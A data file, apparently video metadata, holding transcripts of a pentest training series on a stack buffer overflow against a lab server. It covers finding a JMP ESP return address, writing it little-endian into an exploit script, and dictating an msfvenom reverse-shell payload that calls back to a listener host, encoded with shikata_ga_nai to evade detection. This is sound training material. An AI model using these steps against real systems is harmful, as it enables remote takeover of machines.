00:23:46.480\nSo that's what we want,\nwe want no protection.\n\n504\n00:23:46.480 --> 00:23:49.580\nThat just allows us to kind of dip our toe\ninto there and go, thank you very much,\n\n505\n00:23:49.580 --> 00:23:50.200\nlet me use that.\n\n506\n00:23:50.200 --> 00:23:53.810\nWe have two of those possibilities.\n\n507\n00:23:53.810 --> 00:23:57.110\nOne's right here which is\nthis ESS function.dll and\n\n508\n00:23:57.110 --> 00:23:59.682\nthe other is actual vault server itself.\n\n509\n00:23:59.682 --> 00:24:01.692\nSo you could use one of the other.\n\n510\n00:24:01.692 --> 00:24:04.221\nI'm just gonna go with the first\none that they give us and see and\n\n511\n00:24:04.221 --> 00:24:05.231\nrun it off the flag pole.\n\n512\n00:24:05.231 --> 00:24:06.535\nSee if that salutes.\n\n513\n00:24:06.535 --> 00:24:11.893\nSo I know that the ESS func.dll\nhas no protections on and\n\n514\n00:24:11.893 --> 00:24:14.973\nso that's a good module to use.\n\n515\n00:24:14.973 --> 00:24:19.680\nSo the next thing I need to know is\nI need to find the instructions at.\n\n516\n00:24:19.680 --> 00:24:25.510\nWhere is the instruction that\nI need that JMP ESP reside,\n\n517\n00:24:25.510 --> 00:24:27.820\nwhere does it happen,\nthat's the one we need to find.\n\n518\n00:24:27.820 --> 00:24:33.420\nCool thing is we've got another neat\nlittle Ruby script or an interface even.\n\n519\n00:24:33.420 --> 00:24:34.700\nIt becomes like a little shell.\n\n520\n00:24:34.700 --> 00:24:37.713\nIt's called the NASM shell, N-A-S-M,\n\n521\n00:24:37.713 --> 00:24:43.900\nwhich will show us what hex value we need\nto look for to find that very thing.\n\n522\n00:24:43.900 --> 00:24:49.202\nSo I'm gonna jump back over\nhere to my Kali Linux,\n\n523\n00:24:49.202 --> 00:24:55.786\nI'm going to locate nsan_,\nwhat is it, shell is it, .rb.\n\n524\n00:24:55.786 --> 00:24:57.330\nYeah, there we go.\n\n525\n00:24:59.150 --> 00:25:01.348\nDo my old cut and copy and paste.\n\n526\n00:25:04.611 --> 00:25:09.059\nPaste that in there and then hit Enter.\n\n527\n00:25:09.059 --> 00:25:11.450\nIt should give me a prompt.\n\n528\n00:25:11.450 --> 00:25:12.370\nYes, there we go.\n\n529\n00:25:12.370 --> 00:25:14.240\nSo now I'm inside the NASM thing.\n\n530\n00:25:14.240 --> 00:25:18.549\nAnd I just want it to tell me, what is\nthe hex equivalent of a JMP ESP command.\n\n531\n00:25:18.549 --> 00:25:19.550\nThat's what I need to know.\n\n532\n00:25:19.550 --> 00:25:22.460\nSo just type it in jmp esp.\n\n533\n00:25:22.460 --> 00:25:28.190\nHit return and there we go,\nthere's my two-byte hex value for jmp esp.\n\n534\n00:25:28.190 --> 00:25:33.330\nSo now I know what to look for\ninside of that module to\n\n535\n00:25:33.330 --> 00:25:36.650\nsend it to where I want it to go,\nso we can hit that ESP register.\n\n536\n00:25:36.650 --> 00:25:39.720\nI can exit out of that folder,\nthere we go.\n\n537\n00:25:39.720 --> 00:25:43.080\nI need FFE4, so\nthat's what I'm gonna look for.\n\n538\n00:25:43.080 --> 00:25:47.520\nAnd you do have to structure is a certain\nway in true hex format, but whatevs.\n\n539\n00:25:47.520 --> 00:25:50.350\nSo now we can run back, close this.\n\n540\n00:25:51.960 --> 00:25:55.660\nInside of mona modules we'll search,\nit's mona, it's not mona modules.\n\n541\n00:25:55.660 --> 00:25:57.000\nI keep saying that.\n\n542\n00:25:57.000 --> 00:26:00.340\nWe look for modules using mona,\nnow we're gonna search using mona.\n\n543\n00:26:00.340 --> 00:26:05.140\nInside of a module for\nthat jump esp FFE4 value, right.\n\n544\n00:26:06.420 --> 00:26:13.248\nSo I'm gonna do Amona then we'll say find,\n-s like so,\n\n545\n00:26:13.248 --> 00:26:18.385\nthe quotations around this /xff/xe4.\n\n546\n00:26:18.385 --> 00:26:24.177\nThen close it after quotations and\nthen -m for\n\n547\n00:26:24.177 --> 00:26:30.580\nthe module which was essfunc.tll and\nhit return.\n\n548\n00:26:30.580 --> 00:26:35.010\nAll right, so\nsays it found a total of nine pointers.\n\n549\n00:26:35.010 --> 00:26:40.150\nOf nine possible results that could\ngive us what we're looking for.\n\n550\n00:26:40.150 --> 00:26:45.110\nAgain, I like to start with the top\none and just double-click it.\n\n551\n00:26:45.110 --> 00:26:47.700\nAnd you'll notice that if I\ndouble-click it, it takes me to return.\n\n552\n00:26:47.700 --> 00:26:50.867\nThat's not what I'm looking for,\nI'm looking for jmp esp.\n\n553\n00:26:50.867 --> 00:26:54.549\nThat is not it, so let's close that one.\n\n554\n00:26:54.549 --> 00:26:56.504\nIf I can get this over help,\nplease, thank you.\n\n555\n00:26:56.504 --> 00:26:57.297\nBe gone.\n\n556\n00:26:57.297 --> 00:27:00.940\nLet's try this one.\n\n557\n00:27:00.940 --> 00:27:02.180\nJmp esp.\n\n558\n00:27:02.180 --> 00:27:03.390\nThat is a good value.\n\n559\n00:27:03.390 --> 00:27:04.870\nThat's what I'm looking for.\n\n560\n00:27:04.870 --> 00:27:09.040\nThere is the memory,\nthe hex memory value right there.\n\n561\n00:27:09.040 --> 00:27:10.040\nGonna get out my little pen.\n\n562\n00:27:10.040 --> 00:27:11.345\nI'm actually gonna do that right now.\n\n563\n00:27:11.345 --> 00:27:17.543\n[LAUGH] And I'm gonna say 625011BB.\n\n564\n00:27:17.543 --> 00:27:24.610\nThat should give us a correct jump\nbecause it is FFE4 which is jmp esp.\n\n565\n00:27:24.610 --> 00:27:28.680\nThat's what we're looking for and\nif everything goes according to plan.\n\n566\n00:27:28.680 --> 00:27:31.144\nThen that's a big if, right.\n\n567\n00:27:31.144 --> 00:27:32.084\n[LAUGH] I love this stuff.\n\n568\n00:27:32.084 --> 00:27:34.110\n&gt;&gt; [LAUGH]\n&gt;&gt; It's one big question mark usually.\n\n569\n00:27:34.110 --> 00:27:38.180\nWe should be able to get\nalong just fine with that.\n\n570\n00:27:38.180 --> 00:27:42.790\nSo let me close this and\nstill running, getting out of there.\n\n571\n00:27:42.790 --> 00:27:46.320\nSpring up my views,\nCP is looking good our normal view backup.\n\n572\n00:27:48.340 --> 00:27:54.278\nAnd let's move back over to our fuzzer.\n\n573\n00:27:54.278 --> 00:27:57.720\nSo we're going to replace three fuzz.\n\n574\n00:27:57.720 --> 00:28:00.200\nWe're going to do a nano three fuzz.\n\n575\n00:28:00.200 --> 00:28:05.030\nWe're going to do a little chopping and\ndicing here on our scripts.\n\n576\n00:28:05.030 --> 00:28:06.100\nI'm gonna replace that.\n\n577\n00:28:10.520 --> 00:28:16.110\nTake all this out and\nmake it that actual format.\n\n578\n00:28:16.110 --> 00:28:17.825\nThis is where we talked\nabout little Endian.\n\n579\n00:28:17.825 --> 00:28:19.200\n&gt;&gt; Mm-hm.\n\n580\n00:28:19.200 --> 00:28:23.600\n&gt;&gt; Funny little business,\nlittle Endian, little E-n-d-i-a-n or\n\n581\n00:28:23.600 --> 00:28:24.910\nI think that's how it's spelled.\n\n582\n00:28:24.910 --> 00:28:28.456\nLittle Endian which means take that value,\n[SOUND], flip it around.\n\n583\n00:28:28.456 --> 00:28:29.470\n&gt;&gt; Okay.\n\n584\n00:28:29.470 --> 00:28:31.065\n&gt;&gt; If you don't flip it around,\nit does not work.\n\n585\n00:28:31.065 --> 00:28:32.450\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n586\n00:28:32.450 --> 00:28:36.480\nwhen you go to type in your EAP values\ninto your scripts, you must use what's\n\n587\n00:28:36.480 --> 00:28:42.070\ncalled little Endian formats, which is\nwhatever you saw and when you look at it.\n\n588\n00:28:42.070 --> 00:28:46.570\nReverse that process and put it in that\nway, so it's a very important thing.\n\n589\n00:28:46.570 --> 00:28:50.279\nAnd we need to do that\nin a specific fashion,\n\n590\n00:28:50.279 --> 00:28:54.607\nwhich is going to be with\na little bit of like this x.\n\n591\n00:28:54.607 --> 00:29:01.080\nLet's see, it will be bb/x then\nit was 1 1/x which was 5 0 and\n\n592\n00:29:01.080 --> 00:29:08.760\nthen slash x, I think I'm doing\nthe slashes correctly, I'm pretty sure.\n\n593\n00:29:08.760 --> 00:29:13.490\nAnd then 6 2,\nput my quotations around that and\n\n594\n00:29:13.490 --> 00:29:18.470\nnow we should see that\nvalue inside of our EIP.\n\n595\n00:29:18.470 --> 00:29:19.800\nWe should see, right?\n\n596\n00:29:19.800 --> 00:29:23.950\nSo let's save and control [INAUDIBLE]\nx and\n\n597\n00:29:23.950 --> 00:29:26.300\neverything is running,\neverything is running.\n\n598\n00:29:26.300 --> 00:29:28.436\nGo ahead and fire off 3fuzz.\n\n599\n00:29:28.436 --> 00:29:31.070\nMan, I gotta take that out of there.\n\n600\n00:29:31.070 --> 00:29:32.430\nSo anyway.\n\n601\n00:29:32.430 --> 00:29:36.700\nAll right, let's look and\nI didn't quite get what I was looking for.\n\n602\n00:29:36.700 --> 00:29:39.560\nSo that means I've gotta fiddle around.\n\n603\n00:29:39.560 --> 00:29:45.060\nEven though it did say the jmp esp\nwas correct there, maybe it wasn't.\n\n604\n00:29:45.060 --> 00:29:47.580\nI need to go back and\ntry a bunch of different values.\n\n605\n00:29:47.580 --> 00:29:49.650\nNow I kind of knew this was gonna happen.\n\n606\n00:29:49.650 --> 00:29:52.420\nSo I want us to take a look\nat the final exploit code,\n\n607\n00:29:52.420 --> 00:29:55.120\nwhich has the correct value in there for\nthis to work.\n\n608\n00:29:55.120 --> 00:29:58.880\nCuz I went through all nine modules and\nfound out which ones worked and used that.\n\n609\n00:29:58.880 --> 00:30:02.540\nBut I did want you to\nsee that didn't work.\n\n610\n00:30:02.540 --> 00:30:07.130\nNot a big deal, it had eight others to\ngo through, go back and look at one.\n\n611\n00:30:07.130 --> 00:30:11.370\nAnd maybe even though the first\none said it was a return,\n\n612\n00:30:11.370 --> 00:30:13.110\nmaybe it does actually do a jmp esp.\n\n613\n00:30:13.110 --> 00:30:15.970\nSo try them all, just throw\neverything in the kitchen sink at it.\n\n614\n00:30:15.970 --> 00:30:18.770\nIf it doesn't work, try something else.\n\n615\n00:30:18.770 --> 00:30:19.940\nFiddle with it.\n\n616\n00:30:19.940 --> 00:30:22.518\nA lot of this is just a staring\ncontest between you and the computer.\n\n617\n00:30:22.518 --> 00:30:26.560\nGoing hmm, what, hmmm.\n\n618\n00:30:26.560 --> 00:30:27.630\nLet me try this.\n\n619\n00:30:27.630 --> 00:30:29.120\nTry everything you can think of.\n\n620\n00:30:29.120 --> 00:30:32.420\nSo let me fire it off one more time and\nI'll show you guys just so you can see.\n\n621\n00:30:32.420 --> 00:30:33.790\nActually I don't need to.\n\n622\n00:30:33.790 --> 00:30:35.046\nI'll just show you the split code.\n\n623\n00:30:35.046 --> 00:30:39.769\nNano sploit.py, so\nthat you can see right here,\n\n624\n00:30:39.769 --> 00:30:44.277\nthat was the good value that I found for\nthe EIP.\n\n625\n00:30:44.277 --> 00:30:46.370\nYou actually see a bunch of\nother stuff in here as well, but\n\n626\n00:30:46.370 --> 00:30:48.000\nthat's what I want you to focus on.\n\n627\n00:30:48.000 --> 00:30:50.820\nThat value was correct,\nit's in NDN format.\n\n628\n00:30:50.820 --> 00:30:54.630\nIf I run this and I stop it with Mona or\nnot with Mona, with immunity.\n\n629\n00:30:54.630 --> 00:30:56.650\nThat value will show up in the EIP.\n\n630\n00:30:56.650 --> 00:30:58.340\nWhich actually gives me the jmp esp.\n\n631\n00:30:59.970 --> 00:31:01.370\nNow we are primed and ready.\n\n632\n00:31:01.370 --> 00:31:04.840\nNow that we know, let's just\npretend I did the dirty work and\n\n633\n00:31:04.840 --> 00:31:05.920\nfound out which module it was.\n\n634\n00:31:05.920 --> 00:31:08.590\nWhich I did, but I did it for you.\n\n635\n00:31:08.590 --> 00:31:09.340\nThere we go.\n\n636\n00:31:09.340 --> 00:31:12.900\nWe are ready to create shell code and\nmove on with the final stage.\n\n637\n00:31:12.900 --> 00:31:16.850\nCreate this final exploit, so\nthat weekend exploit the system.\n\n638\n00:31:16.850 --> 00:31:18.390\n&gt;&gt; All right, Daniel, fantastic.\n\n639\n00:31:18.390 --> 00:31:19.530\nGreat demonstrations there.\n\n640\n00:31:19.530 --> 00:31:22.762\nReally get to see how we\ncan use Immunity Debugger.\n\n641\n00:31:22.762 --> 00:31:27.610\nSome Mona modules to track down and\none where that ESP and\n\n642\n00:31:27.610 --> 00:31:32.660\nthe EIP registers are within our string or\nbuffer that we were sending.\n\n643\n00:31:32.660 --> 00:31:36.980\nAnd now we're just about ready to\ncapitalize on that information.\n\n644\n00:31:36.980 --> 00:31:40.310\nSo we appreciate that, wanna make sure\neverybody stays tuned for the next one,\n\n645\n00:31:40.310 --> 00:31:42.020\ncuz now you're gonna see\nit all put together.\n\n646\n00:31:42.020 --> 00:31:46.230\nAnd we're gonna hopefully successfully\nlaunch a buffer overflow attack that\n\n647\n00:31:46.230 --> 00:31:47.880\nwe wrote from scratch.\n\n648\n00:31:47.880 --> 00:31:48.510\n&gt;&gt; Love it, love it.\n\n649\n00:31:48.510 --> 00:31:49.300\n&gt;&gt; All right.\n\n650\n00:31:49.300 --> 00:31:51.360\nHope everybody enjoyed watching this one,\ntune in for\n\n651\n00:31:51.360 --> 00:31:53.020\nthe next one to see the end result.\n\n652\n00:31:53.020 --> 00:31:55.850\nSigning out for ITProTV,\nI've been your host Mike Rodrick.\n\n653\n00:31:55.850 --> 00:31:56.650\n&gt;&gt; And I'm Daniel Lowrie.\n\n654\n00:31:56.650 --> 00:31:57.556\n&gt;&gt; And we'll see you next time\n\n655\n00:31:57.556 --> 00:32:04.441\n[MUSIC]\n\n656\n00:32:04.441 --> 00:32:08.144\n&gt;&gt; Thank you for watching ITProTV.\n\n",
          "vimeoId": "202088017"
        },
        {
          "description": "In this episode, Dan and Mike continue to look at buffer overflow attacks. They create the shellcode to launch a reverse shell, create the exploit, and launch the attack.",
          "length": "1375",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-4-buffer_overflows_pt4-013117-PGM.00_22_42_04.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-4-buffer_overflows_pt4-013117-PGM.00_22_42_04.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-4-buffer_overflows_pt4-013117-PGM.00_22_42_04.Still001-sm.jpg",
          "title": "Buffer Overflows Part 4",
          "transcript": "WEBVTT\n\n1\n00:00:00.000 --> 00:00:06.582\nWelcome to ITProTV,\nI'm your host Don Pezet [CROSSTALK]\n\n2\n00:00:06.582 --> 00:00:08.279\n[MUSIC]\n\n3\n00:00:08.279 --> 00:00:12.174\n&gt;&gt; You're watching ITProTV.\n\n4\n00:00:12.174 --> 00:00:15.521\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV,\n\n5\n00:00:15.521 --> 00:00:19.600\nI'm your host Mike Rodrick and\ntoday we're doing penetration testing.\n\n6\n00:00:19.600 --> 00:00:20.833\nAnd in this episode,\n\n7\n00:00:20.833 --> 00:00:25.088\nwe're gonna be finishing up our little\nminiseries on buffer overflows.\n\n8\n00:00:25.088 --> 00:00:28.602\nThis is part four, so if you missed any\nof the others, parts one, two or three,\n\n9\n00:00:28.602 --> 00:00:30.550\nmake sure you go back and\nwatch those first.\n\n10\n00:00:30.550 --> 00:00:33.210\nIt'll make part four\nmake a lot more sense.\n\n11\n00:00:33.210 --> 00:00:37.670\nBut at this point, we've gone through\nquite a few steps to get where we are.\n\n12\n00:00:37.670 --> 00:00:43.150\nWe're just about ready to really build and\nlaunch our buffer overflow attack.\n\n13\n00:00:43.150 --> 00:00:47.460\nSo I\"m gonna hand it right over to\nthe master himself, Mr. Daniel Lowrie.\n\n14\n00:00:47.460 --> 00:00:48.290\nWelcome back, Daniel.\n\n15\n00:00:48.290 --> 00:00:48.850\n&gt;&gt; All right, Mike.\n\n16\n00:00:48.850 --> 00:00:49.820\nThanks for having me back, man.\n\n17\n00:00:49.820 --> 00:00:54.370\nI appreciate joining us back in the studio\ntoday to finish up buffer overflows.\n\n18\n00:00:54.370 --> 00:00:57.140\nYou've got to be thinking, man,\nthis is a lot of information and\n\n19\n00:00:57.140 --> 00:00:57.900\nyou would be correct.\n\n20\n00:00:57.900 --> 00:00:58.980\nIt is a lot of information.\n\n21\n00:00:58.980 --> 00:01:01.010\nIt's a lot of complex information.\n\n22\n00:01:01.010 --> 00:01:05.250\nWhich is why it's taking up\nfour parts to do, but and\n\n23\n00:01:05.250 --> 00:01:07.010\nthat's why everybody\ndoesn't do it as well.\n\n24\n00:01:07.010 --> 00:01:10.280\nSo that's our gift to\nyou as our viewers is so\n\n25\n00:01:10.280 --> 00:01:12.200\nthat you might be able to\nunderstand these things.\n\n26\n00:01:12.200 --> 00:01:15.680\nReally try to break it down,\nmake it a little easier to digest for\n\n27\n00:01:15.680 --> 00:01:18.120\neverybody out there watching\nwho wants to learn this stuff.\n\n28\n00:01:18.120 --> 00:01:22.550\nSo we're in our last phase of\ncreating our buffer overflow.\n\n29\n00:01:22.550 --> 00:01:27.140\nIn the previous episode,\nwe found the exact EIP area,\n\n30\n00:01:27.140 --> 00:01:31.080\nwe made sure that that existed,\nwe jumped into using MONA.\n\n31\n00:01:31.080 --> 00:01:36.125\nDefine a module that would give us\nthe jump ESP value that we need and\n\n32\n00:01:36.125 --> 00:01:42.265\nthen we found an actual spot to\ndo that inside of that module.\n\n33\n00:01:42.265 --> 00:01:47.295\nNow we are at the final phase\nwhich is creating the shell code\n\n34\n00:01:47.295 --> 00:01:52.180\nthat is going to, actually it's\ngonna go into our ESP register.\n\n35\n00:01:52.180 --> 00:01:55.590\nSo when that jump ESP gets executed,\n\n36\n00:01:55.590 --> 00:01:58.890\nit has some executable\ncode in which to execute.\n\n37\n00:01:58.890 --> 00:02:01.390\nOtherwise, it's just a bunch of Cs and\nwhat good is that?\n\n38\n00:02:01.390 --> 00:02:02.450\nThat's not good at all, right?\n\n39\n00:02:02.450 --> 00:02:05.690\n&gt;&gt; So this is gonna be our malicious\ncode that we wanna get executed.\n\n40\n00:02:05.690 --> 00:02:06.680\n&gt;&gt; That's exactly right.\n\n41\n00:02:06.680 --> 00:02:09.890\nHere's where we put in the nefariousness.\n\n42\n00:02:09.890 --> 00:02:11.250\nThat's what we're gonna do.\n\n43\n00:02:11.250 --> 00:02:12.990\nSo we need to create shell code.\n\n44\n00:02:12.990 --> 00:02:16.477\nAnd I know, Mike, you can just bang\nthat out for us and program that.\n\n45\n00:02:16.477 --> 00:02:17.111\nWe'd appreciate it.\n&gt;&gt; Absolutely,\n\n46\n00:02:17.111 --> 00:02:18.621\nif you can pull that screen\nup here I'll start to-\n\n47\n00:02:18.621 --> 00:02:19.710\n&gt;&gt; Yeah, that's perfect.\n\n48\n00:02:19.710 --> 00:02:22.530\nNo, we can't do that because\nit's very difficult.\n\n49\n00:02:22.530 --> 00:02:25.510\nAnd you'd have to be a very\ngood programmer to do that.\n\n50\n00:02:26.550 --> 00:02:28.620\nNow I'm not telling you that you're\nnot gonna be able to do this.\n\n51\n00:02:28.620 --> 00:02:30.980\nWhat I'm saying is that unless\nyou're an awesome programmer,\n\n52\n00:02:30.980 --> 00:02:34.900\nyou're gonna do like I do and\nrely on somebody to help me.\n\n53\n00:02:34.900 --> 00:02:36.868\nAnd that is our friend at Metasploit.\n\n54\n00:02:36.868 --> 00:02:40.790\nThey have created a wonderful product,\nwe love that products.\n\n55\n00:02:40.790 --> 00:02:43.940\nIt works really well, it's actually\nkind of scary how well it does work.\n\n56\n00:02:43.940 --> 00:02:47.710\nIt has a little feature\ninside of it called msfvenom.\n\n57\n00:02:47.710 --> 00:02:52.340\nAnd msfvenom is actually if you\nhearken back to older Metasploit,\n\n58\n00:02:52.340 --> 00:02:54.085\nthere were two modules.\n\n59\n00:02:54.085 --> 00:02:54.960\nI can't ever remember them.\n\n60\n00:02:54.960 --> 00:02:59.110\nIt was msfencode and\nthere was another one I forget.\n\n61\n00:02:59.110 --> 00:03:02.340\nIt was basically those two put\ntogether and now it's just msfvenom.\n\n62\n00:03:02.340 --> 00:03:05.870\nThose two have been depreciated and\nnow it's msfvenom.\n\n63\n00:03:05.870 --> 00:03:10.240\nWe're gonna use msfvenom to create our\nshell code for us, all we have to do is\n\n64\n00:03:10.240 --> 00:03:15.030\ngive it some parameters, so that it can\ngive us the shell code that we need.\n\n65\n00:03:15.030 --> 00:03:16.690\nOnce the shell code is generated,\nwe copy and\n\n66\n00:03:16.690 --> 00:03:19.404\npaste that into our code creating\na variable parameter for that.\n\n67\n00:03:19.404 --> 00:03:22.460\nAdding it to our string\nof data that's going out\n\n68\n00:03:22.460 --> 00:03:24.690\nthe door into our vulnerable server.\n\n69\n00:03:24.690 --> 00:03:28.380\nAnd voila,\nwe should have exploitable code.\n\n70\n00:03:28.380 --> 00:03:31.410\n&gt;&gt; And I think it was msfpayload,\njust for you guys like the trivia.\n\n71\n00:03:31.410 --> 00:03:33.530\n&gt;&gt; Thank you, yes, that's exactly it.\n\n72\n00:03:33.530 --> 00:03:34.450\nWhy didn't I think of that?\n\n73\n00:03:34.450 --> 00:03:35.780\nThat's what it was.\n\n74\n00:03:35.780 --> 00:03:37.870\nSo, how do we do that, where do we start?\n\n75\n00:03:37.870 --> 00:03:43.080\nWell, we need to do msfvenom, let's jump\ninto my machine and see how we do that.\n\n76\n00:03:43.080 --> 00:03:46.945\nYou just type in msfvenom, like that.\n\n77\n00:03:46.945 --> 00:03:49.400\nThat's our, the beginning of our code.\n\n78\n00:03:49.400 --> 00:03:54.010\nWhat we're gonna do is we're gonna,\nit's gonna be quite a long string\n\n79\n00:03:54.010 --> 00:03:58.000\nof characters, a lot of information\nwe have feed into msfvenom, so\n\n80\n00:03:58.000 --> 00:04:01.032\nthat it creates the proper\nshell code that we need.\n\n81\n00:04:01.032 --> 00:04:04.060\nAll right, first thing we need to do\nis tell what platform we're using.\n\n82\n00:04:04.060 --> 00:04:06.260\nThis is a Windows platform.\n\n83\n00:04:06.260 --> 00:04:11.154\nTo create the shell code or create the\nlistener or the reverse shell or whatever.\n\n84\n00:04:11.154 --> 00:04:13.857\nFirst we're trying to create\na bind shell or reverse Shell,\n\n85\n00:04:13.857 --> 00:04:17.480\non what platform is that going to reside,\nright, or be worked with.\n\n86\n00:04:17.480 --> 00:04:18.828\nIn this case, it's Windows.\n\n87\n00:04:18.828 --> 00:04:25.920\nSo we do -p and we say windows/,\nnow I'm gonna create a reverse shell.\n\n88\n00:04:25.920 --> 00:04:28.850\nI like them to send me shells\ninstead of jumping and\n\n89\n00:04:28.850 --> 00:04:31.350\ntrying to connect to\na shell that they open.\n\n90\n00:04:31.350 --> 00:04:32.220\nIt's just my preference.\n\n91\n00:04:32.220 --> 00:04:35.400\nYou can use a bind shell but\nI'm gonna go reverse shell on this.\n\n92\n00:04:35.400 --> 00:04:41.401\nSo I'll say shell, shell not shoul,\n\n93\n00:04:41.401 --> 00:04:46.850\nshell_reverse_tcp, like so.\n\n94\n00:04:46.850 --> 00:04:49.380\nThen I need to give it a listening host.\n\n95\n00:04:49.380 --> 00:04:54.427\nMy listener will be my box lhost =\n\n96\n00:04:54.427 --> 00:05:00.209\n192.168.219.146.\n\n97\n00:05:00.209 --> 00:05:04.298\nAnd then the port that it's\nlistening on l port equals,\n\n98\n00:05:04.298 --> 00:05:10.301\nI'm going 5555 here cuz I don't wanna\ninterfere with our vuln server stuff.\n\n99\n00:05:11.310 --> 00:05:13.070\nJust in case that would happen.\n\n100\n00:05:13.070 --> 00:05:15.500\nAll right, so now we got the port set in.\n\n101\n00:05:15.500 --> 00:05:16.860\nThe next thing we need to do,\n\n102\n00:05:16.860 --> 00:05:21.580\nI like to do this just so\nthat it helps keep it from crashing after.\n\n103\n00:05:21.580 --> 00:05:24.400\nBut sometimes it works, sometimes it\ndoesn't but just do like a exit function.\n\n104\n00:05:25.585 --> 00:05:31.210\nXIT, I'm gonna spread my,\nthis stuff gets chopped off.\n\n105\n00:05:31.210 --> 00:05:33.480\nI don't want you guys to be\nlooking at choppy code here.\n\n106\n00:05:33.480 --> 00:05:36.190\nEXITFUNC like that equals thread.\n\n107\n00:05:36.190 --> 00:05:37.320\nSo that creates a thread.\n\n108\n00:05:38.530 --> 00:05:41.460\nNow I'll try to shrink it back in so\nI know exactly.\n\n109\n00:05:41.460 --> 00:05:45.930\nThere we go, that makes it look a little\nnicer for you guys out there watching.\n\n110\n00:05:45.930 --> 00:05:47.850\nThat is not a necessity.\n\n111\n00:05:47.850 --> 00:05:53.840\nThat is me being nice to my end user\nbecause Aa lot of times it'll just crash,\n\n112\n00:05:53.840 --> 00:05:55.860\ninstead of, okay.\n\n113\n00:05:55.860 --> 00:05:58.750\nI'm done doing that, now I'll drop that\ncuz it starts as a thread instead of\n\n114\n00:05:58.750 --> 00:06:02.540\ntaking over the entire server service.\n\n115\n00:06:02.540 --> 00:06:03.542\nAnd then crashing it.\n\n116\n00:06:03.542 --> 00:06:06.399\n&gt;&gt; And if your pen testing or\nif you're launching an attack,\n\n117\n00:06:06.399 --> 00:06:08.964\nI mean you wanna take advantage\nof the fact that hey,\n\n118\n00:06:08.964 --> 00:06:13.410\nI can launch buffer overflow and\ntake over this machine if it crashes.\n\n119\n00:06:13.410 --> 00:06:15.950\nCan't really take it over and you don't\nknow where they're gonna find it,\n\n120\n00:06:15.950 --> 00:06:18.910\nrestart it, so you do wanna be\na little careful with that.\n\n121\n00:06:18.910 --> 00:06:22.390\n&gt;&gt; Yeah, you wanna try to be as careful as\npossible, because if you're continually\n\n122\n00:06:22.390 --> 00:06:26.205\ncrashing their system to get into it,\nthat's gonna kind of raise an eyebrow.\n\n123\n00:06:26.205 --> 00:06:31.279\nSo you might wanna throw this on top of\nthe hip just to make it a little nicer and\n\n124\n00:06:31.279 --> 00:06:34.465\nin that sense they won't\nget their eye raised.\n\n125\n00:06:34.465 --> 00:06:38.148\nAll right, so we got,\nnow I didn't do a -f c,\n\n126\n00:06:38.148 --> 00:06:43.170\nbecause this is C code,\nI basically wanted to format this in C.\n\n127\n00:06:44.200 --> 00:06:48.980\nThat will be my shell code and then -a\nwill be the architecture, which is x86.\n\n128\n00:06:48.980 --> 00:06:54.405\nThis is a 32 bit program, so\nI need to throw that at that.\n\n129\n00:06:54.405 --> 00:06:57.270\nThen --platform, yes,\nit sounds a little redundant,\n\n130\n00:06:57.270 --> 00:06:59.390\nbecause we already did a platform.\n\n131\n00:06:59.390 --> 00:07:02.640\nBut we're doing platform for\nsomething else for the encoding part.\n\n132\n00:07:02.640 --> 00:07:04.680\nSo I'm letting you know\nwhat platform that is.\n\n133\n00:07:04.680 --> 00:07:10.000\nThat's just platform which is windows -b,\nremember that bad characters.\n\n134\n00:07:10.000 --> 00:07:12.890\nIf we were to a found bad characters or\n\n135\n00:07:12.890 --> 00:07:19.140\nwe want a window of [INAUDIBLE]\njust like the mail bytes, right?\n\n136\n00:07:19.140 --> 00:07:21.910\nThe carriage return,\nthings that typically cause problems.\n\n137\n00:07:21.910 --> 00:07:24.030\nWe go ahead and\nthrow that on the fire and let it know,\n\n138\n00:07:24.030 --> 00:07:25.970\nyou know what just leave those out.\n\n139\n00:07:25.970 --> 00:07:27.210\nI don't care if it can handle them or not,\n\n140\n00:07:27.210 --> 00:07:29.970\nI don't wanna go through the process\nof trying to figure out whether or\n\n141\n00:07:29.970 --> 00:07:33.210\nnot it can, so I know those can\ntypically be bad characters.\n\n142\n00:07:33.210 --> 00:07:34.110\nLet's just leave those out.\n\n143\n00:07:34.110 --> 00:07:36.820\nThen you just have to define what\nthose bad characters are and\n\n144\n00:07:36.820 --> 00:07:41.080\nyou do that by exclamation point and\ngiving it their hex value.\n\n145\n00:07:41.080 --> 00:07:46.907\nSo you gotta do the /x00/x0a and\n/x0d like so\n\n146\n00:07:46.907 --> 00:07:52.370\nand finish it off with the double quotes.\n\n147\n00:07:52.370 --> 00:07:56.874\nThen we got one more thing to do which\nis what encoder are we going to use.\n\n148\n00:07:56.874 --> 00:08:00.120\nThis is a fun thing to say and\nit's even funnier thing to type.\n\n149\n00:08:00.120 --> 00:08:01.605\nA more fun thing to type.\n\n150\n00:08:01.605 --> 00:08:05.413\n&gt;&gt; [LAUGH]\n&gt;&gt; So say -e for our encoder Which will be\n\n151\n00:08:05.413 --> 00:08:11.455\nX8060 our architecture is 32 bit,\nand it is shikata_ga_nai.\n\n152\n00:08:11.455 --> 00:08:12.862\nYeah, it's a mouthful.\n\n153\n00:08:12.862 --> 00:08:14.418\nIt's Japanese obviously.\n\n154\n00:08:14.418 --> 00:08:17.271\nWell maybe not obviously,\nbut it's Japanese.\n\n155\n00:08:17.271 --> 00:08:21.006\nAnd it means nothing else or\nsomething to that effect.\n\n156\n00:08:21.006 --> 00:08:22.444\nIt's a strange term.\n\n157\n00:08:22.444 --> 00:08:27.402\nBut Metasploit is the only encoder\nthey give the excellent rating to for\n\n158\n00:08:27.402 --> 00:08:32.780\nencoders because of basically,\nit's a very polymorphic algorithm.\n\n159\n00:08:32.780 --> 00:08:37.691\nKinda just makes sure that it gets\nsome decoding, so that it doesn't go,\n\n160\n00:08:37.691 --> 00:08:41.252\ntthis is bad code and\ndrop it because it's shell code.\n\n161\n00:08:41.252 --> 00:08:44.380\nSo that it decodes well inside of your.\n\n162\n00:08:44.380 --> 00:08:49.280\nSo any kind of extra stank that they\nput on it to look for bad code,\n\n163\n00:08:49.280 --> 00:08:51.970\nand to rid themselves of it, or kill it\n&gt;&gt; It's like that wrapper that makes it\n\n164\n00:08:51.970 --> 00:08:54.480\nlook like a pretty present that\nthe computer wants, right?\n\n165\n00:08:54.480 --> 